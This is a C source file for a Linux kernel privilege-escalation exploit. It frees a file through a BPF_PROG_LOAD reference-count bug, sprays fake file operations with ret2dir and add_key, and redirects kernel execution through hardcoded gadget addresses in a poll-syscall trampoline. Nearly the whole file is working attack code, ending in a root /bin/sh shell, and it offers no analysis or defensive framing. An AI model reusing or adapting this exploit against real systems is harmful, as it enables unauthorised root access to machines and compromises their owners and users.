#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <err.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <linux/bpf.h>
#include <assert.h>
#include <poll.h>
#include "libexp.h"

#define USER_ADDR 0x20000
#define POLL_ADDR 0x30000
#define CRASH_IP 0xffffffff8185a169

/******************************************************************/
/*************************AUTO GENERATED***************************/
#define _GNU_SOURCE
#ifndef va_start
#include <stdarg.h>
#endif
#ifndef assert
#include <assert.h>
#endif
#ifndef signal
#include <signal.h>
#endif
#ifndef sched_setaffinity
#include <sched.h>
#endif

// we need this because rcx may not be restored in the trampoline
// so it will crash during kernel-user switch
void get_shell(int signum) {
    printf("uid: %d\n", getuid());
    system("/bin/sh");
    while(1);
}

void __attribute__((constructor)) _ret2reg_init() {
    signal(SIGSEGV, get_shell);
    signal(SIGTRAP, get_shell);
}

unsigned long _args[6];
unsigned long _arg_num = 0;
void __trigger()
{
        *(u64*)0x30004 = 0xffffffff81000be9;
        *(u64*)0x3000c = 0xffffffff8244ab00;
        *(u64*)0x30014 = 0xffffffff810d0ad0;
        *(u64*)0x3001c = 0xffffffff81021c3c;
        *(u64*)0x3006c = 0xffffffff814b8f7e;

    __asm__(".intel_syntax noprefix;"
            "push rbp;"

            "mov rcx, %0;"
            "mov rdi, [rcx+8*0];"
            "mov rsi, [rcx+8*1];"
            "mov rdx, [rcx+8*2];"
            "mov r10, [rcx+8*3];"
            "mov r8, [rcx+8*4];"
            "mov r9, [rcx+8*5];"

                        "mov r12, 0xffffffff813a8a49;"
                        "mov r10, 0xffffffff81c00162;"

            "mov rax, 7;"
            "syscall;"
            "pop rbp;"
            ".att_syntax;"
            : : "r"(_args));
}

void _trigger(int num_args, ...)
{
    va_list ap;
    va_start(ap, num_args);
    for(int i=0; i<num_args; i++) {
        _args[_arg_num++] = va_arg(ap, unsigned long);
    }
    va_arg(ap, unsigned long);
    va_end(ap);

    __asm__(".intel_syntax noprefix;"
            "call __trigger;"
            ".att_syntax;");
    _arg_num = 0;
    if(getuid() == 0) get_shell(0);
}

#define NUMARGS(...)  (sizeof((unsigned long[]){__VA_ARGS__})/sizeof(unsigned long))
#define ret2reg_trigger(...) _trigger(NUMARGS(__VA_ARGS__), __VA_ARGS__ )
/*************************AUTO GENERATED***************************/
/******************************************************************/

int uaf_fd;
volatile int exit_flag = 0;
char payload[0x100-0x18];
u64 fake_ops[0x80/8];
void *kaddr;
struct pollfd *pfds;

int subproc_func(void *p) {
	prctl(PR_SET_PDEATHSIG, SIGKILL);
	sleep(100000);
}

u64 _get_mem_size(void)
{
	FILE *f = fopen("/proc/meminfo", "r");
	char *line_buf = NULL;
	char *buf;
	size_t n;

	assert(f != NULL);

	if(getline(&line_buf, &n, f) < 0) {
		free(line_buf);
		goto out;
	}
	buf = strstr(line_buf, ":") + 1;
	fclose(f);
	return atoll(buf) * 1024;

out:
	puts("fail to read memory size");
	fclose(f);
	return -1;
}

void dec_refcount(void)
{
	struct bpf_insn insns[2] = {
		{
			.code = BPF_LD | BPF_IMM | BPF_DW,
			.src_reg = BPF_PSEUDO_MAP_FD,
			.imm = uaf_fd
		},
		{}
	};

	union bpf_attr attr = {
		.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
		.insn_cnt = 2,
		.insns = (__aligned_u64) insns,
		.license = (__aligned_u64)""
	};
	if (syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr)) != -1)
		errx(1, "expected BPF_PROG_LOAD to fail, but it didn't");
	if (errno != EINVAL)
		err(1, "expected BPF_PROG_LOAD to fail with -EINVAL, got different error");
}

void context_setup(void)
{
	// close all fd so that when the subprocess exits, only the uaf_fd will be closed
	// for(int i=0; i<1000; i++) {
	// 	if(i != 1) close(i);
	// }

	/* step 1: open writable UAF fd*/
	uaf_fd = open("/dev/null", O_WRONLY | O_CLOEXEC);
	if(uaf_fd < 0) err(1, "unable to open UAF fd");
	/* refcount is now 1 */

	/* step 2: create a subprocess that shares the fd table */
	char *child_stack = malloc(8000);
	int child = clone(subproc_func, child_stack + 8000, CLONE_FILES | CLONE_VM | SIGCHLD, NULL);
	if (child == -1)
		err(1, "clone");
	/* refcount is now 2 */
}

void payload_setup(void)
{
	pfds = umem_alloc(POLL_ADDR, 0x1000);
	pfds[0].fd = 0; // actually allocate the page

	// prepare fake file_ops
	fake_ops[1] = 0;// lseek
	fake_ops[0x70/8] = 0; // close
	fake_ops[0x40/8] = CRASH_IP; // poll
	// memset(fake_ops, 'X', 0x80);

	// use ret2dir to spray the fake fops
	u64 upper_limit = _get_mem_size() & (~0xfff);
	u64 kaddr = 0xffff880000000000 + upper_limit/4*3;
	kaddr &= 0xfffffffffffff000;
	printf("kaddr: %llx\n", kaddr);
	for(int i=0;i<upper_limit/0x1000/4;i++) {
		void *addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
		memcpy(addr, fake_ops, sizeof(payload));
	}

	// prepare fake file
	long *ptr = (long *)(payload+6);
	memset(payload, 0x4, sizeof(payload));
	ptr[2] = kaddr;
	// void *ret = mmap((void *)USER_ADDR, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0);
	// if(ret != (void *)USER_ADDR) error_out("fail to mmap");
	// ptr = (long *)(USER_ADDR + 0x8);
	// *ptr = CRASH_IP;
	// ptr = (long *)(USER_ADDR + 0x70);
	// *ptr = CRASH_IP;
}

void trigger(void)
{
	/* step 3: use BPF to remove one reference */
	dec_refcount();

	/* step 4: kill the subprocess to remove one more reference */
	exit_flag = 1;
}

// perfrom exploit once
void exploit(void) {
	context_setup();
	trigger();
	usleep(100000);// wait for the free to happen

	add_key_spray_num(payload, sizeof(payload), 0x40);
	// lseek(uaf_fd, 0, SEEK_SET);
	pfds[0].fd = uaf_fd;
	// poll(pfds, 30, 0);
	ret2reg_trigger(pfds, 30, 0);

	sleep(10000);
	// close(uaf_fd);
}

int main(void) {
	set_cpu(0);
	payload_setup();
	while(1) {
		puts("attempt...");
		usleep(10);
		int pid = clean_fork();
		assert(pid >= 0);
		if(!pid) {
			set_cpu(1);
			exploit();
			exit(0);
		}
		sleep(3);
		puts("done!");
		exit(0);
		// waitpid(-1, &status, WNOHANG);
		// wait(NULL);
	}
}
